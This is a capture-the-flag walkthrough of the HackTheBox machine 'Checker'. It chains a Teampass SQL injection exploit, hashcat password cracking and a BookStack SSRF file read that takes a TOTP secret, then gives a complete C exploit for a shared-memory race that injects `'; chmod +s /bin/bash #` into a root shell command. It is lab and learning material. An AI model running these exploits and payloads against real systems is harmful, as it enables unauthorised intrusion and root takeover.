---
title: Checker
categories: [HackTheBox]
tags: [linux, cve, reversing, passwordcracking]
media_subpath: /images/hackthebox_checker/
image:
  path: 'https://labs.hackthebox.com/storage/avatars/afe87a33205a5ffd978c805aa93488a9.png'
---

# Summary

Checker is a hard machine from HackTheBox, which focuses heavily on public `CVEs` exploit. 

We started off with an `nmap` scan to identify the open ports and services running on the target machine. We found two web servers running on ports `80` and `8080`. On port `80`, we found a `bookstack` instance, while on port `8080`, we found a `Teampass` instance. We exploited a `SQL Injection` vulnerability in `Teampass` to obtain user credentials for `ssh` and `bookstack`. Since the `ssh` was protected with mfa, we tried enumerating other services. After logging into `bookstack`, we exploited a `Server Side Request Forgery (SSRF)` vulnerability to read a file containing a `TOTP` secret, which we used to log in as another user. Finally, we reversed the `check-leak.sh` script to find a `race condition` vulnerability in the `check_leak` binary, which allowed us to escalate our privileges to `root`.

# Walkthrough

## Nmap Scan

```bash
sudo nmap -sVC -Pn -oN nmap 10.10.11.56
```

```bash
22/tcp   open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    syn-ack Apache httpd
8080/tcp open  http    syn-ack Apache httpd
```

We see two web servers running on ports 80 and 8080, let's start with the one on port 8080

## (8080) Web Server

When we try accessing the web server on port 8080, we are greeted with a login page for a Teampass instance.

![NON](file-20250530155315208.png)

Searching for `teampass` exploits, we found a [CVE-2023-1545](https://security.snyk.io/vuln/SNYK-PHP-NILSTEAMPASSNETTEAMPASS-3367612) exploit for a `SQL Injection` vulnerability in Teampass.

By executing the exploit, we extracted two different user hashes:

```bash
bash teampass.sh http://checker.htb:8080

There are 2 users in the system:
admin: $2y$10$lKCae0EIUNj6f96ZnLqnC.LbWqrBQCT1LuHEFht6PmE4yH75rpWya
bob: $2y$10$yMypIj1keU.VAqBI692f..XXn0vfyBL7C1EhOs35G59NxmtpJ/tiy
```

From the obtained hashes, we were able to crack the `bob` user hash using `hashcat`:

```bash
hashcat -m 3200 ./hashes /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt --username
```

```
hashcat -m 3200 hashes --username --show

bob:$2y$10$yMypIj1keU.VAqBI692f..XXn0vfyBL7C1EhOs35G59NxmtpJ/tiy:cheerleader
```

By accessing the `Teampass` instance with the `bob` user, we can see that he has two stored passwords, one for ssh access for the user `reader` and another for "boosktack" login: 

![NON](file-20250530155426813.png)
![NON](file-20250530155429485.png)

Trying to access the `ssh` with the `reader` user:

![NON](file-20250530173905194.png)

We are prompted for a MFA code, which we don't have.

## (80) Web Server

Accessing the web server on port 80, we see that it is indeed running an instance of a `bookstack`.

![NON](file-20250531013858189.png)

Trying to access with the credentials we obtained from the `Teampass` instance, we can log in as `bob`.

![NON](file-20250530155627541.png)

Searching for exploits for `bookstack`, we found a post on [`Fluid Attacks`](https://fluidattacks.com/advisories/imagination) about a `Server Side Request Forgery (SSRF)` vulnerability which leads to LFR (Local File Read). [Post 1](https://fluidattacks.com/advisories/imagination) [Post 2](https://fluidattacks.com/blog/lfr-via-blind-ssrf-book-stack)

We can capture the request to `save-draft` in the same way as shown in the post video from post 1:

![NON](file-20250531032632681.png)

Trying the exploit with `php-filter-chains-oracle-exploit`, we got an error on the execution

```bash
uv add --script filters_chain_oracle_exploit.py -r requirements.txt
Updated `filters_chain_oracle_exploit.py`
```
> Note: The `uv` command is used to run the script with the required dependencies, automatically creating a virtual environment if it doesn't exist.
{: .prompt-info}

```bash
uv run filters_chain_oracle_exploit.py --target 'http://checker.htb/ajax/page/8/save-draft' --file '/backup/home_backup/home/reader/.google_authenticator' --verb PUT --parameter html --proxy http://localhost:8080 --headers '{"X-CSRF-TOKEN": "uttAXWOCXoUWEJsbI9owIs7N5wkWzVi93yzrorOO","Content-Type":"application/x-www-form-urlencoded","Cookie":"bookstack_session=eyJpdiI6InFUNkdubkVMRGlKUHJiSUFJZjI1dEE9PSIsInZhbHVlIjoiRGppNG9vSXJVandscUxnd2gzTmRodVZkZHVRNTlpV1J5NkVMeldrVk9JQ1VZVE9mQkFvQ3h5dkEvd0FpdEhJeXdkWTBKN0pLUDJCbjd1bjljOVVhQVh4bXgvV3ljV1Y4U0xxT3l3ZDlxVWFyNDdXT2ZFSHkwR1p6M3hpbzZCVzMiLCJtYWMiOiIyZjY0ZjhmOGEwNjg3YjNmYmZmM2NkMjg0OTE4OGI4MjI4NGM2NTFhMjllODczN2NlNWM2MTA1MDdlNDIxOTMyIiwidGFnIjoiIn0%3D"}'

<SNIP>
  File "/home/h4z4rd0u5/.local/share/uv/python/cpython-3.9.22-linux-x86_64-gnu/lib/python3.9/base64.py", line 87, in b64decode
    return binascii.a2b_base64(s)
binascii.Error: Invalid base64-encoded string: number of data characters (1) cannot be 1 more than a multiple of 4
```

Looking at the request sent from the exploit, we can see that the `html` parameter is being sent as a pure `php filter chain`, but the `SSRF` is triggerd by the `img` tag, which is not being sent in the request.
![NON](file-20250530172633414.png)

We need to send the SSRF like the one shown on the post `<img src='data:image/png;base64,<BASE64SSRFENDPOINT>'/>`, for that, we need to fix the `requestor.py` file in the exploit, which is the one that makes the request, to include the appropriate tag in the request. We need to add the following line:

![NON](file-20250531043730079.png)

After that, the exploit starts to dump the requested file:

```bash
uv run filters_chain_oracle_exploit.py --target 'http://checker.htb/ajax/page/8/save-draft' --file '/backup/home_backup/home/reader/.google_authenticator' --verb PUT --parameter html --proxy http://localhost:8080 --headers '{"X-CSRF-TOKEN": "nKJHEfWLIkhw0kD2spl5VrQBvVDEUEqEpqjvSJN2","Content-Type":"application/x-www-form-urlencoded","Cookie":"bookstack_session=eyJpdiI6IjUvMGZWNW1IRjMwNGh6QkJNWUlJMmc9PSIsInZhbHVlIjoiMDltZ0VJRG9FbEhpbzNVYXAxb3VrRVgxdmJsSVptcC80QlpqUWJudGxuNUZUTi9HcWwyaFVQUGFoMmVIWFNaQk00blBqMlR3ejU3SUhIclBEWS90b3JsM1lpa28vUlg0cngzaDB1QnViSnYwa0lOaUVQMFBoMXdCcWJzZlBtUFAiLCJtYWMiOiI1YWY5ZjBmMTgwZDk3MDA0ODM1ZjllMDg0NTViMDIyYzk2ZjVhNTc3NGVjOGNiZGZmZjEyNjkyYTIzYWQyNWMwIiwidGFnIjoiIn0%3D"}'
```

![NON](file-20250530172749013.png)

Based on the posts on the bookstack, we see a reference to a possible backup folder.

![NON](file-20250530160455320.png)

Based on the ssh MFA, we could try to see if there is a `otp` file like the one based on this post on how to setup `ssh` with `OTP` https://cr0hn.medium.com/enhancing-ssh-server-security-configuring-otp-for-ssh-access-a65c097bcc8a

We started off trying to dump the `/home/reader/.google_authenticator`, but it didn't returned anything, after that, we tried `/backup/home_backup/home/reader/.google_authenticator` and it did work, giving us a `TOTP` file.

From this file, we can then register to an online [authenticator password generator](https://totp.danhersam.com/). After generating the code, we are able to successfully login at the server as `reader`

![NON](file-20250530175406905.png)

## Privilege Escalation

Looking our user's privileges, we can see that we are able to run `/opt/hash-checker/check-leak.sh` as `root` user, looking at the script we can see that it is running an `ELF` binary. To better analyze it, we can send the binary to our machine and reverse engineer it with tools such as `ghidra` or `IDA`.

![NON](file-20250530175630705.png)

### Reverse Engineering

Looking at the `main` function of the binary, the following snippets are what draw our attention:

![NON](file-20250531045555108.png)

![NON](file-20250531045729811.png)

#### Race Condition Explanation

1. High-level picture

```bash
sudo check-leak.sh  <user>
        │
        └──> /opt/hash-checker/check_leak   (set-uid-root ELF)
                    │
      ┌─────────────┴───────────────┐
      │                             │
  write_to_shm()                sleep(1)  ◄───• handy race-window
      │                             │
      └── creates a SysV            ▼
          SHM seg (0666) →  notify_user()
                                    │
                                    └── uses popen(3) to build & *shell-execute*
                                        a mysql CLI command that embeds whatever
                                        it read out of the shared‐memory blob.

```
So the vulnerability is really the combination of two smaller problems:
|#|	Bug	Where	| Why it matters |
|---|---|---|
|1|	World-writable shared memory key is revealed to the attacker|	write_to_shm() prints 0x%X, then sleep(1)	Attacker can attach before notify_user() reads it|
|2|	Unsanitised data from SHM is interpolated into a shell command	snprintf(... "mysql … \"%s\"'") inside notify_user()|	Lets us inject arbitrary shell metacharacters that run as root


So we need to leverage the 1 second window by overwriting the SHM segment with a string that terminates the SQL, appends a malicious command like `chmod +s /bin/bash`, comments the rest, then simply executes the newly SUID-rooted bash, removing the `suid` bit (for cleanup purposes, not needed).


2. Chronological execution trace (with the bug highlighted)

2.1. User-controlled entry point

```bash
sudo /opt/hash-checker/check-leak.sh bob
```

Because of the `NOPASSWD` sudo rule, an attacker can run this as often as they like.

2.2. Shell wrapper (`check-leak.sh`) sanitises the first argument (`bob → “bob”`) and execs the real `ELF`.

2.3. `check_leak` (set-uid root) – success path

|Step|	Source line	|What happens|
|---|---|---|
|➀	|`puts("Password is leaked!")`	|cosmetic|
|➁	|`uVar2 = write_to_shm(__ptr)`	|creates SysV SHM – mode 0666 – returns key/id|
|➂|	`printf("Using the shared memory 0x%X …\n", uVar2)`	|Leakes the key to stdout| 
|➃|	`fflush(stdout)`	|guarantees the attacker can read it immediately|
|➄	|`sleep(1)`	|!!! 1-second race window|
|➅	|`notify_user(..., uVar2)`	|later parses same SHM|

2.4. `notify_user()`

Critical slice only:

```bash
    __shmid = shmget(key, 0, 0666);
    __haystack = shmat(__shmid, NULL, 0);
    pc = strstr(__haystack, "Leaked hash detected");        // attacker controls bytes
    pc = strchr(pc, '>') + 1;                               // → start of “hash”
    hash = trim_bcrypt_hash(pc);                            // lax filtering
    snprintf(cmd, …,
        "mysql -u %s -D %s -s -N -e 'select email … pw  = \"%s\"'", …, hash);
    popen(cmd, "r");                                        // **shell executed as root**
```

If `hash` begins with a single-quote, the outer `-e '…'` string is closed → everything the attacker writes after that single quote becomes raw shell.

3. Why the single-quote payload wins the quoting game

Original intent:

```bash
mysql … -e 'select … pw  = "<BCRYPT_HASH>"'
```

Injected content:

```bash
> '; chmod +s /bin/bash #     ← finally, notify_user() sees this
                     └────────┬─ comment-out remainder (incl. mismatched quotes)
                               └─ runs as root

```
Resulting command line as the kernel sees it:

```bash
mysql -u <user> -D <db> -s -N -e 'select email … pw  = "' ; chmod +s /bin/bash #'
```

- The first `'` closes the SQL argument.

- `;` starts a brand-new shell command (chmod +s /bin/bash).

- `#` turns the trailing garbage (the unmatched `'` and anything else) into a comment,
    silencing syntax errors.

4. Race-condition & shared-memory details

|Property	|Value	|Why helpful to the attacker|
|---|---|---|
|Key disclosure	|printed directly (0x%X)|	no brute-forcing|
|Mode|	0666 (0x1b6) in both producer and consumer	|any UID can shmat()
|Window	|fixed 1 second |sleep(1)	|trivial to win even in a slow VM
|Consumer logic	|read-only – no integrity check (no SHA, no length check, etc.)	|we can completely overwrite buffer

Hence the PoC just needs to:

- Starts the privileged binary with popen().

- Waits until the “Using the shared memory …” line appears.

- shmget() → shmat() → strncpy() payload into segment.

- Detaches and waits; one second later notify_user() fires.

5 . Exploit code walk-through

```c
/*
 * checker-exploit.c  –  concise PoC for HTB write-up
 *
 * gcc checker-exploit.c -o checker-exploit
 * ./checker-exploit               ➜ # root shell
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ipc.h>
#include <sys/shm.h>

int main(void)
{
    /* 1 ─── launch vulnerable helper via sudo (no password required) */
    FILE *proc = popen("sudo /opt/hash-checker/check-leak.sh bob", "r");
    if (!proc) { perror("popen"); return 1; }

    /* 2 ─── parse the line: “Using the shared memory 0xXXXXXXXX …” */
    unsigned int key = 0;
    char line[256];
    while (fgets(line, sizeof line, proc)) {
        if (sscanf(line, "Using the shared memory 0x%x", &key) == 1)
            break;
    }
    if (!key) { fprintf(stderr, "Key not found\n"); return 1; }

    /* 3 ─── attach, overwrite, detach */
    int shmid = shmget(key, 0, 0);            /* size=0 → just look it up   */
    if (shmid == -1) { perror("shmget"); return 1; }

    char *mem = shmat(shmid, NULL, 0);
    if (mem == (char *)-1) { perror("shmat"); return 1; }

    const char *evil =
        "Leaked hash detected > '; chmod +s /bin/bash #";
        /*   └──── closes quote ─┬─┘          └─ comment rest of line      */
    strcpy(mem, evil);                      /* buffer is plenty large       */
    shmdt(mem);

    pclose(proc);                           /* let root process hit popen() */
    system("/bin/bash -p");                 /* pops SUID-root bash          */
    return 0;
}
```
How it works — one paragraph version

- `check_leak` prints the SysV SHM key (0xKEY) before a one-second sleep(1).

- The segment is world-writable (0666), so we shmget()/shmat() it and drop `'; chmod +s /bin/bash #` right after the magic marker string.

- When `notify_user()` wakes up, it builds a `mysql -e '… "%s"'` shell command; our leading single-quote closes that string, `;` starts a new root shell command, and `#` comments out whatever remains → `chmod +s /bin/bash` executes as root.

- Finally the exploit launches `/bin/bash -p`, inheriting the fresh SUID bit.

#### TL;DR

The entire chain hinges on a one-second window where world-writable shared memory is already created but the privileged process has not yet consumed it. By racing into that gap and planting a string that breaks out of -e '…' quoting, we convince root’s shell to `chmod +s /bin/bash`, yielding an instant persistent privilege escalation.

After compiling the exploit on target machine with `gcc exploit.c -o exploit`, we can run it to get a root shell:

![NON](file-20250530184634666.png)

## Quick Recap
We exploited a `SQL Injection` vulnerability in `Teampass` to obtain user credentials for `ssh` and `bookstack`, since `ssh` was protected with mfa, we tried enumerating other services. After logging into `bookstack`, we exploited a `Server Side Request Forgery (SSRF)` vulnerability to read a file containing a `TOTP` secret, which we used to log in as `reader`. Finally, we reversed the `check-leak.sh` script to find a `race condition` vulnerability in the `check_leak` binary, which allowed us to escalate our privileges to `root`.
